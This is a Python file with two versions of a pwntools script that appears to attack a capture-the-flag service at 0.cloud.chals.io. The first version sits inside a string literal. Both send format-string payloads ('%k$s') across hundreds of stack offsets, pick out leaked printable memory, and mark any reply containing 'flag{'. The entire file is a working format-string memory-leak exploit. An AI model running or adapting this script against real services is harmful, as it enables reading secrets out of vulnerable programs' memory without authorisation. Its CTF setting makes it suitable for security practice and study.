'''
#!/usr/bin/env python3
# save as leak_fmt.py
from pwn import remote
import string, time, re

HOST = "0.cloud.chals.io"
PORT = 23963

# heuristics
MIN_PRINT_LEN = 6   # minimum printable run length to consider
MAX_OFFSET = 200

def is_mostly_printable(s, thresh=0.85):
    if not s:
        return False
    printable = sum(1 for c in s if c in string.printable)
    return (printable / max(1, len(s))) >= thresh and len(s) >= MIN_PRINT_LEN

def clean_response(raw):
    # try to strip known noise and control characters
    if isinstance(raw, bytes):
        try:
            raw = raw.decode(errors='ignore')
        except:
            raw = str(raw)
    # remove tcpdump noise if any (from your earlier capture), keep ascii
    return ''.join(ch for ch in raw if ch in string.printable)

def probe_offset(k, timeout=1.5):
    r = remote(HOST, PORT, timeout=5)
    try:
        # receive initial banner / prompt (if any)
        try:
            pre = r.recvrepeat(timeout=0.5).decode(errors='ignore')
        except Exception:
            pre = ""
        payload = f"%{k}$s"
        r.sendline(payload)
        # read reply (service appears to echo back)
        reply = r.recvrepeat(timeout=timeout).decode(errors='ignore')
    except Exception as e:
        r.close()
        return None, str(e)
    r.close()
    return pre + "\n" + reply, None

def main():
    found = []
    out_lines = []
    for k in range(1, MAX_OFFSET+1):
        resp, err = probe_offset(k)
        if err:
            print(f"[!] offset {k}: error {err}")
            continue
        txt = clean_response(resp)
        # avoid tiny or empty things
        if is_mostly_printable(txt):
            score = len(txt)
            marker = ""
            if "flag{" in txt.lower():
                marker = "<<<POSSIBLE FLAG>>>"
            print(f"[+] offset {k:3d}: len={len(txt):3d} {marker}\n    {txt[:200]!r}\n")
            found.append((k, txt))
        # keep all outputs for offline inspection
        out_lines.append(f"--- offset {k} ---\n{txt}\n\n")
        # small sleep to be polite
        time.sleep(0.05)

    # write candidates to file
    with open("fmt_leaks_candidates.txt", "w") as f:
        f.writelines(out_lines)
    print(f"\n[+] Done. {len(found)} printable candidates printed. Full dump in fmt_leaks_candidates.txt")
    if found:
        print("[+] Top candidates (first 20 shown):")
        for k, txt in found[:20]:
            short = txt if len(txt) < 200 else txt[:190] + "..."
            print(f"  offset {k:3d}: {short!r}")

if __name__ == "__main__":
    main()
'''

#!/usr/bin/env python3
from pwn import remote
import string, time

HOST = "0.cloud.chals.io"
PORT = 23963

MIN_PRINT_LEN = 6   # minimum length to consider
MAX_OFFSET = 500    # extended offset range
SKIP_KEYWORDS = ['tcpdump', 'IP ', 'Flags', 'length', 'seq', 'win', 'options']

def is_mostly_printable(s, thresh=0.7):
    if not s:
        return False
    printable = sum(1 for c in s if c in string.printable)
    return (printable / max(1, len(s))) >= thresh and len(s) >= MIN_PRINT_LEN

def clean_response(raw):
    if isinstance(raw, bytes):
        try:
            raw = raw.decode(errors='ignore')
        except:
            raw = str(raw)
    # remove control chars, keep all printable
    return ''.join(ch for ch in raw if ch in string.printable)

def probe_offset(k, timeout=1.5):
    r = remote(HOST, PORT, timeout=5)
    try:
        # receive banner/prompt if any
        try:
            r.recvrepeat(timeout=0.5)
        except:
            pass
        payload = f"%{k}$s"
        r.sendline(payload)
        reply = r.recvrepeat(timeout=timeout).decode(errors='ignore')
    except Exception as e:
        r.close()
        return None, str(e)
    r.close()
    return reply, None

def main():
    found = []
    out_lines = []
    for k in range(1, MAX_OFFSET+1):
        resp, err = probe_offset(k)
        if err:
            print(f"[!] offset {k}: error {err}")
            continue
        txt = clean_response(resp)
        # skip noise
        if any(word in txt for word in SKIP_KEYWORDS):
            continue
        if is_mostly_printable(txt):
            marker = ""
            if "flag{" in txt.lower():
                marker = "<<<POSSIBLE FLAG>>>"
            print(f"[+] offset {k:3d}: len={len(txt):3d} {marker}\n    {txt[:200]!r}\n")
            found.append((k, txt))
        # save all candidate outputs
        out_lines.append(f"--- offset {k} ---\n{txt}\n\n")
        time.sleep(0.05)  # polite pacing

    # write candidates to file
    with open("fmt_leaks_candidates.txt", "w") as f:
        f.writelines(out_lines)
    print(f"\n[+] Done. {len(found)} printable candidates. Full dump in fmt_leaks_candidates.txt")
    if found:
        print("[+] Top candidates (first 20 shown):")
        for k, txt in found[:20]:
            short = txt if len(txt) < 200 else txt[:190] + "..."
            print(f"  offset {k:3d}: {short!r}")

if __name__ == "__main__":
    main()
